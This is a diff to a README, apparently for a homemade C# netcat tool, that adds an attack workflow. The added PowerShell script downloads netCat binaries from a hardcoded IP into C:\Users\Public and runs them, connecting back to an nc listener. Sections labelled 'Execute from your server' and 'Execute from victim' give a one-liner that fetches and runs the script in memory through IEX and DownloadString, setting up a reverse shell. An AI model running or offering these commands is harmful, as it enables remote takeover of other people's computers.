@@ -1,5 +1,7 @@
 ## Robert Chaves Perez (r0b0t95) 2023
 
+**C# script**
+
 ```C#
 namespace cc
 {
@@ -161,46 +163,51 @@ namespace cc
 }
 ```
 
-**DownLoad**
+**Invoke-nc.ps1**
 
 ```powershell
 <#
 Robert Chaves Perez (r0b0t95) 2023
-.\invoke-nc.ps1 -url '<url>' 
+
+python3 -m http.server 8000
+
+nc -lvnp 8001
+
+IEX (New-Object Net.WebClient).DownloadString("http://<serverIp>:8000/invoke-nc.ps1") | powershell -noprofile
 #>
 
-param(
-    [string]$url
-)
+#change the ip by your IP
+$ip = '192.168.23.129'
+$portNetCat = '8001'
+$portPython3 = '8000'
 
 $files = 'netCat.deps.json', 'netCat.dll', 'netCat.exe', 'netCat.pdb', 'netCat.runtimeconfig.json'
 
+for ($i = 0; $i -lt $files.Length; ++$i){
 
-if(-Not [string]::IsNullOrEmpty($url)){
+   $path = 'C:\Users\Public\' + $files[$i]
+        
+   $fileUrl = 'http://' + $ip + ':' + $portPython3 + '/' + $files[$i]
 
-    for ($i = 0; $i -lt $files.Length; ++$i){
-
-        $path = 'C:\Users\Public\' + $files[$i]
-
-        $fileUrl = $url + '/' + $files[$i]
-
-        Write-Host $fileUrl
-
-        Invoke-WebRequest -Uri $fileUrl -Outfile $path
-     
-    }
-
+   Invoke-WebRequest -Uri $fileUrl -Outfile $path
+   
 }
 
-C:\Users\Public\netCat.exe
+Start-Sleep -Seconds 1
+
+Set-Location C:\Users\Public
+
+.\netCat.exe $ip $portNetCat
 ```
 
-**Execute**
+**Execute from your server**
+```bash
+python3 -m http.server 8000
 
-```powershell
-.\invoke-nc.ps1 -url '<url>'
+nc -lvnp 8001
 ```
 
+**Execute from victim**
 ```powershell
- .\netCat.exe <ipServer> <port>
+IEX (New-Object Net.WebClient).DownloadString("http://<serverIp>:8000/invoke-nc.ps1") | powershell -noprofile
 ```
